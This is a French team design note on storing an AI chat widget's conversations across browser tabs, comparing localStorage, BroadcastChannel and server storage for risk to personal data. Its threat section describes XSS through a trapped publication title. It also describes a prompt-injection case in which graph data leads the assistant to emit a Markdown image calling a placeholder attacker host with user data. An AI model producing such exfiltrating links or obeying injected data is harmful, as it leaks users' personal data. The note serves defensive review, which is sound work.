# Persistance des conversations du chat IA — note de discussion

> Statut : en attente de décision d'équipe. Aucune implémentation pour l'instant.

## Besoin

- Les conversations doivent être **partagées entre tous les onglets** ouverts par un même utilisateur.
- Il est acceptable qu'elles soient **perdues quand tous les onglets sont fermés**.
- Contrainte : le chat peut renvoyer des **données personnelles ou sensibles** qui ne doivent pas être accessibles ailleurs.

## Existant

`src/app/[lang]/components/aiChat/aiChatAdapter.ts` conserve conversations et messages **en mémoire**, dans l'instance de l'adapter (`Map` en mémoire). Conséquences :

- perte à chaque rechargement de page, à chaque changement de langue (le widget est remonté) ;
- aucun partage entre onglets ;
- le backend Crisalid Agents est sans état (stateless) : il ne stocke aucune conversation.

Point d'appui technique : l'interface `ChatAdapter` de `@mui/x-chat-headless` propose un hook `subscribe({ onEvent })` qui accepte des événements temps réel (`conversation-added`, `message-added`, …). Il permet d'injecter dans l'interface des changements venus d'un autre onglet.

## Options étudiées

### 1. localStorage (clé par `personUid`, synchro via l'événement `storage`)

- \+ Le plus simple à implémenter.
- − Données **écrites sur disque, en clair**, dans le profil du navigateur.
- − Elles **survivent à la fermeture du navigateur et à l'expiration de la session** (JWT 12 h) ; une purge au `signOut` ne couvre pas l'utilisateur qui ferme le navigateur sans se déconnecter.
- − Lisibles par toute personne ayant accès au poste (poste partagé, ordinateur prêté) et par les extensions du navigateur.
- − En cas de faille XSS, **tout l'historique accumulé** est exfiltrable.
- Le chiffrement côté client (WebCrypto) n'apporte que peu : la clé reste sur le même poste.

### 2. Mémoire + `BroadcastChannel` (recommandée)

- Les conversations restent en mémoire ; chaque modification est diffusée aux autres onglets et injectée via `subscribe`.
- Un nouvel onglet demande l'état sur le canal, un onglet déjà ouvert lui répond.
- Canal nommé par utilisateur (`personUid`) ; message de purge diffusé au `signOut`.
- \+ **Rien sur disque** ; tout disparaît avec le dernier onglet, ce qui correspond exactement au besoin.
- \+ Même surface d'attaque XSS que l'existant (un script injecté peut déjà lire la mémoire de la page).
- − Les données vivent plus longtemps qu'aujourd'hui (tant qu'un onglet est ouvert).
- − Plus de code (environ 50 lignes de plus que le localStorage) et des cas à traiter : deux onglets envoyant un message dans la même conversation, onglet ouvert pendant une réponse en cours de diffusion (streaming), déconnexion dans un seul onglet.

### 3. Stockage côté serveur (base de données)

- \+ Le plus sûr côté client : accès protégé par l'authentification, disponible sur tous les appareils.
- − Nettement plus lourd : schéma Prisma, DAO, service, routes API.
- − Stocker ces données sur le serveur pose des **questions RGPD** (durée de conservation, droit à l'effacement).

## Rappel sur les menaces

- **Accès local** : quelqu'un accède au poste (poste partagé, session système ouverte, logiciel malveillant). Ce risque est propre au stockage sur disque (option 1).
- **XSS (cross-site scripting)** : attaque **à distance**, sans accès au poste. Exemple : une publication déposée sur HAL avec un titre piégé est moissonnée par l'ETL ; si elle est affichée sans échappement, le code s'exécute dans le navigateur de chaque utilisateur qui la consulte et peut lire mémoire, DOM et localStorage. React échappe par défaut ; le risque se concentre sur `dangerouslySetInnerHTML`, le rendu Markdown/HTML, les URLs `javascript:` et les bibliothèques tierces.
- **Injection de prompt (prompt injection)**, propre au chat : une donnée du graphe peut amener l'assistant à produire une image Markdown `![](https://attaquant/?d=<données>)`. Si le widget affiche les images, le navigateur envoie les données à l'attaquant, sans JavaScript. **Indépendant de la persistance, mais à vérifier** dans le rendu Markdown de `@mui/x-chat`.

## Points à trancher en équipe

1. Le choix de stockage : mémoire + `BroadcastChannel` (recommandé), localStorage ou serveur.
2. La purge à la déconnexion (recommandée quelle que soit l'option).
3. La conversation « Welcome » : la recréer à chaque montage dans la langue courante sans la diffuser entre onglets (proposé), ou la persister comme les autres.
4. L'audit du rendu Markdown des réponses de l'assistant (images, liens) vis-à-vis de l'injection de prompt.
